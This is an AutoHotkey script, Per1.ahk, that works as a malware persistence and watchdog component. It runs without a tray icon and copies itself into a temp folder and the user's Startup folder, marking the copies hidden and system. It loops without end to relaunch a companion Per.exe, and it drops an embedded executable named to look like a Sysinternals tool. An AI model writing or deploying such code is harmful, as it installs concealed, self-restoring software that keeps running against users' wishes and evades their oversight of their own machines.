#NoEnv
SendMode Input
SetWorkingDir %A_ScriptDir%
#Persistent
#SingleInstance Force
#NoTrayIcon

; Per1.ahk

currentDir := A_ScriptDir

targetDir := "C:\Users\" . A_Username . "\tmp"
tempDir := "C:\Users\" . A_Username . "\AppData\Local\Tmp"
tmpDir := "C:\Users\" . A_Username . "\AppData\Local\Tmp\Tmp"
startupDir := "C:\Users\" . A_Username . "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
sysStartupDir := "C:\Users\" . A_Username . "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SysInternal.exe"
startupFile := startupDir . "Per1.exe"  ; Define the specific file to watch
tmpDirFile := tempDir . "\Per.exe" ; Added backslash for correct path

IfNotExist, %tmpDir%
{
    FileCreateDir, %tmpDir%
}

FileCopy, %currentDir%\Per1.exe, %tmpDir%\Per1.exe, 1

If (currentDir = tmpDir)
{
    Loop
    {
        IfNotExist, %startupFile%
        {
            FileCopy, %currentDir%\Per1.exe, %startupFile%, 1
            FileSetAttrib, +SH, %startupFile%
        }
        Process, Exist, Per.exe
        If (ErrorLevel = 0) ; Process not running
        {
            IfNotExist, %tmpDirFile%
            {
                FileCopy, %startupDir%\Per.exe, %tmpDirFile%, 1
            }
            else
            {
                Run, %tmpDirFile%
            }
        }
        Process, Exist, SysInternal.exe
        If (ErrorLevel = 0) ; Process not running
        {
            IfNotExist, %tmpDirFile%
            {
                FileInstall, SysInternal.exe, %sysStartupDir%, 1
                FileSetAttrib, +SH, %sysStartupDir%
            }
            else
            {
                Run, %sysStartupDir%
            }
        }
        Sleep, 5
    }
}
else
{
    Run, %tmpDir%\Per1.exe
}
